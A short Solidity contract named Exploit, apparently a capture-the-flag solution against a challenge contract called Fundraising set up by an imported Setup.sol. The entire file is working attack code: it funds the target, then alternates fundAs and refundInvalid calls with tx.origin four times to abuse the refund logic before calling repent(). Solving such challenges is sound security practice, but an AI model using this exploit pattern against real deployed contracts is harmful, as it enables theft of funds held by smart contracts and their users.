pragma solidity 0.8.9;

import './Setup.sol';

contract Exploit {
    Fundraising challenge;
    constructor(Fundraising _challenge) payable {
        challenge = _challenge;
    }

    function exploit() public {
        challenge.fund{value: 1000 gwei}();

        challenge.fundAs{value: 500 gwei}(address(tx.origin));
        challenge.refundInvalid(address(tx.origin));
        challenge.fundAs{value: 500 gwei}(address(tx.origin));
        challenge.refundInvalid(address(tx.origin));
        challenge.fundAs{value: 500 gwei}(address(tx.origin));
        challenge.refundInvalid(address(tx.origin));
        challenge.fundAs{value: 500 gwei}(address(tx.origin));
        challenge.refundInvalid(address(tx.origin));

        challenge.repent();
    }

    fallback() external payable {

    }
}